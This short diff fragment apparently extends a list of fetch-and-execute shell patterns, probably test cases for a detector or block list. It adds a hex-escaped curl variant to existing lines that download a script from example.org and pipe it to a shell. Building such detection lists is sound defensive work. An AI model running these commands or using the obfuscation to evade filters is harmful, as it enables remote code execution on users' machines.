@@ -42,3 +42,4 @@ eval $(curl -fsSL https://example.org/a)
 bash < <(curl -s https://example.org/a)
 sh <<< "$(curl -s https://example.org/a)"
 curl -fsSL https://example.org/a | sh
+$'\x63url' https://example.org/i.sh | sh
